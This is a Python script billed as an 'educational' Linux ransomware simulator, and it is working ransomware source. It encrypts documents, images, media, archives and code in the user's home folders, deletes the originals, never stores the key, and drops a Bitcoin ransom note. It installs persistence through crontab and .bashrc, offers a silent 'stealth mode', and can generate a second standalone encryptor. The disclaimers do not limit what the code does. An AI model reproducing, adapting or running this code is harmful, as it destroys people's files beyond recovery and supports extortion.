#!/usr/bin/env python3
"""
Portable Linux Ransomware Simulator
Single executable file that can run on any Linux system
WARNING: Educational purposes only! Run in isolated environment.
"""
import os
import sys
import time
import json
import base64
import hashlib
import platform
import tempfile
import subprocess
from pathlib import Path
from cryptography.fernet import Fernet

class PortableLinuxRansomware:
    """
    Self-contained ransomware simulator for Linux.
    Can be distributed as a single file.
    """
    
    def __init__(self, target_dirs=None, silent=False):
        self.target_dirs = target_dirs or [
            "~/Documents",
            "~/Downloads", 
            "~/Desktop",
            "~/Pictures",
            "~/Videos",
            "~/Music"
        ]
        self.silent = silent
        self.encrypted_files = []
        self.key = None
        self.system_info = self._gather_system_info()
        
        # File extensions to target
        self.target_extensions = {
            '.txt', '.doc', '.docx', '.pdf', '.odt',
            '.jpg', '.jpeg', '.png', '.gif', '.bmp',
            '.mp3', '.wav', '.flac',
            '.mp4', '.avi', '.mkv',
            '.zip', '.tar', '.gz',
            '.py', '.js', '.html', '.css',
            '.sql', '.db', '.sqlite'
        }
        
        # Extension for encrypted files
        self.encrypted_ext = ".linux_locked"
    
    def _gather_system_info(self):
        """Gather system information for targeting."""
        info = {
            "platform": platform.system(),
            "release": platform.release(),
            "machine": platform.machine(),
            "user": os.getenv("USER", "unknown"),
            "home": os.path.expanduser("~"),
            "hostname": platform.node()
        }
        return info
    
    def _log(self, message):
        """Logging function."""
        if not self.silent:
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            print(f"[{timestamp}] {message}")
    
    def generate_key(self):
        """Generate encryption key."""
        self._log("Generating encryption key...")
        key_material = os.urandom(32)
        self.key = base64.urlsafe_b64encode(key_material)
        return self.key
    
    def find_target_files(self):
        """Find files to encrypt."""
        self._log("Searching for target files...")
        target_files = []
        
        for dir_pattern in self.target_dirs:
            dir_path = Path(os.path.expanduser(dir_pattern))
            if dir_path.exists():
                try:
                    for file_path in dir_path.rglob("*"):
                        if (file_path.is_file() and 
                            file_path.suffix.lower() in self.target_extensions and
                            not file_path.name.endswith(self.encrypted_ext) and
                            ".ssh" not in str(file_path) and  # Avoid SSH keys
                            "/proc" not in str(file_path) and
                            "/sys" not in str(file_path)):
                            target_files.append(file_path)
                except PermissionError:
                    continue
        
        self._log(f"Found {len(target_files)} target files")
        return target_files
    
    def encrypt_file(self, file_path):
        """Encrypt a single file."""
        try:
            # Read original file
            with open(file_path, 'rb') as f:
                data = f.read()
            
            if len(data) == 0:
                return False
            
            # Encrypt data
            cipher = Fernet(self.key)
            encrypted_data = cipher.encrypt(data)
            
            # Write encrypted file
            encrypted_path = str(file_path) + self.encrypted_ext
            with open(encrypted_path, 'wb') as f:
                f.write(encrypted_data)
            
            # Delete original file
            file_path.unlink()
            
            self.encrypted_files.append({
                "original": str(file_path),
                "encrypted": encrypted_path,
                "size": len(data)
            })
            
            self._log(f"Encrypted: {file_path.name}")
            return True
            
        except Exception as e:
            self._log(f"Failed to encrypt {file_path}: {e}")
            return False
    
    def create_ransom_note(self):
        """Create ransom note."""
        note_content = f"""
===============================================
          YOUR FILES HAVE BEEN ENCRYPTED
===============================================

All your important files have been encrypted using military-grade AES-256
encryption. Your files are now inaccessible without the decryption key.

System Information:
- Platform: {self.system_info['platform']} {self.system_info['release']}
- User: {self.system_info['user']}
- Hostname: {self.system_info['hostname']}

Files encrypted: {len(self.encrypted_files)}

To recover your files, you must:
1. Send 0.1 Bitcoin to wallet: [DEMO_WALLET_ADDRESS]
2. Email proof of payment to: demo@ransomware.linux

===============================================
           EDUCATIONAL SIMULATION ONLY
    No actual ransom is required - this is a demo
===============================================

Encrypted files:
"""
        
        for i, file_info in enumerate(self.encrypted_files[:10], 1):
            note_content += f"{i}. {os.path.basename(file_info['original'])}\n"
        
        if len(self.encrypted_files) > 10:
            note_content += f"... and {len(self.encrypted_files) - 10} more files\n"
        
        note_content += "\n" + "="*50 + "\n"
        
        # Write note to desktop and home directory
        note_locations = [
            os.path.expanduser("~/Desktop/READ_ME_NOW.txt"),
            os.path.expanduser("~/READ_ME_NOW.txt")
        ]
        
        for location in note_locations:
            try:
                with open(location, 'w') as f:
                    f.write(note_content)
                self._log(f"Created ransom note: {location}")
            except:
                pass
    
    def attempt_persistence(self):
        """Attempt to establish persistence."""
        self._log("Attempting persistence...")
        
        # Try to add to crontab
        try:
            cron_job = f"0 * * * * {sys.executable} {os.path.abspath(__file__)} --silent\n"
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            current_crontab = result.stdout
            
            if "READ_ME_NOW" not in current_crontab:  # Avoid duplicate entries
                new_crontab = current_crontab + cron_job
                subprocess.run(['crontab', '-'], input=new_crontab, text=True)
                self._log("Added to crontab (hourly execution)")
        except:
            self._log("Failed to add crontab entry")
        
        # Try to add to .bashrc
        try:
            bashrc_path = os.path.expanduser("~/.bashrc")
            payload = f"\n# Educational payload\n{sys.executable} {os.path.abspath(__file__)} --silent &\n"
            
            with open(bashrc_path, 'a') as f:
                f.write(payload)
            self._log("Added to .bashrc")
        except:
            self._log("Failed to modify .bashrc")
    
    def run(self, delay=0.1, limit=None):
        """Execute the ransomware simulation."""
        self._log("="*50)
        self._log("PORTABLE LINUX RANSOMWARE SIMULATOR")
        self._log("Educational purposes only!")
        self._log("="*50)
        
        # Generate key
        self.generate_key()
        
        # Find and encrypt files
        target_files = self.find_target_files()
        
        if limit:
            target_files = target_files[:limit]
        
        self._log(f"Encrypting {len(target_files)} files...")
        
        for i, file_path in enumerate(target_files, 1):
            if self.encrypt_file(file_path):
                time.sleep(delay)  # Small delay for demonstration
            
            if i % 10 == 0:
                self._log(f"Progress: {i}/{len(target_files)} files processed")
        
        # Create ransom note
        self.create_ransom_note()
        
        # Attempt persistence
        self.attempt_persistence()
        
        # Summary
        self._log("="*50)
        self._log("SIMULATION COMPLETE")
        self._log(f"Files encrypted: {len(self.encrypted_files)}")
        self._log(f"Total size: {sum(f['size'] for f in self.encrypted_files):,} bytes")
        self._log("="*50)
        
        return len(self.encrypted_files)

def create_portable_executable():
    """Create a portable executable version of this script."""
    import stat
    
    script_content = '''#!/usr/bin/env python3
import os, sys, time, base64, platform
from pathlib import Path
from cryptography.fernet import Fernet

# Embedded configuration
TARGET_DIRS = ["~/Documents", "~/Downloads", "~/Desktop"]
ENCRYPTED_EXT = ".portable_locked"
TARGET_EXTENSIONS = {'.txt', '.doc', '.pdf', '.jpg', '.png'}

def run_portable_ransomware():
    print("[PORTABLE] Starting educational ransomware simulation...")
    
    # Generate key
    key = base64.urlsafe_b64encode(os.urandom(32))
    cipher = Fernet(key)
    
    # Find and encrypt files
    encrypted_count = 0
    for dir_pattern in TARGET_DIRS:
        dir_path = Path(os.path.expanduser(dir_pattern))
        if dir_path.exists():
            for file_path in dir_path.rglob("*"):
                if (file_path.is_file() and 
                    file_path.suffix.lower() in TARGET_EXTENSIONS and
                    not file_path.name.endswith(ENCRYPTED_EXT)):
                    try:
                        # Read and encrypt
                        with open(file_path, 'rb') as f:
                            data = f.read()
                        encrypted_data = cipher.encrypt(data)
                        
                        # Write encrypted version
                        encrypted_path = str(file_path) + ENCRYPTED_EXT
                        with open(encrypted_path, 'wb') as f:
                            f.write(encrypted_data)
                        
                        # Delete original
                        file_path.unlink()
                        encrypted_count += 1
                        print(f"[ENCRYPTED] {file_path.name}")
                        time.sleep(0.05)  # Small delay
                        
                    except Exception as e:
                        pass  # Silent fail
    
    # Create note
    note = f"""PORTABLE RANSOMWARE SIMULATION
================================
Files encrypted: {encrypted_count}
This is educational only - no real ransom required.
"""
    try:
        with open(os.path.expanduser("~/DEMO_COMPLETE.txt"), 'w') as f:
            f.write(note)
    except:
        pass
    
    print(f"[COMPLETE] Encrypted {encrypted_count} files")
    return encrypted_count

if __name__ == "__main__":
    if "--silent" not in sys.argv:
        run_portable_ransomware()
'''
    
    # Write portable script
    portable_path = "portable_ransomware.py"
    with open(portable_path, 'w') as f:
        f.write(script_content)
    
    # Make executable
    os.chmod(portable_path, stat.S_IRWXU | stat.S_IRGRP | stat.S_IROTH)
    
    print(f"[PORTABLE] Created portable executable: {portable_path}")
    return portable_path

def main():
    """Main entry point."""
    import argparse
    
    parser = argparse.ArgumentParser(description="Portable Linux Ransomware Simulator")
    parser.add_argument("--silent", action="store_true", help="Run silently")
    parser.add_argument("--delay", type=float, default=0.1, help="Delay between files")
    parser.add_argument("--limit", type=int, help="Limit number of files to encrypt")
    parser.add_argument("--portable", action="store_true", help="Create portable executable")
    parser.add_argument("--dirs", nargs="+", help="Target directories")
    
    args = parser.parse_args()
    
    if args.portable:
        create_portable_executable()
        return
    
    # Create and run ransomware
    ransomware = PortableLinuxRansomware(
        target_dirs=args.dirs,
        silent=args.silent
    )
    
    encrypted_count = ransomware.run(delay=args.delay, limit=args.limit)
    
    if not args.silent:
        print(f"\nSimulation encrypted {encrypted_count} files")
        print("Use '--silent' flag for stealth mode")

if __name__ == "__main__":
    main()
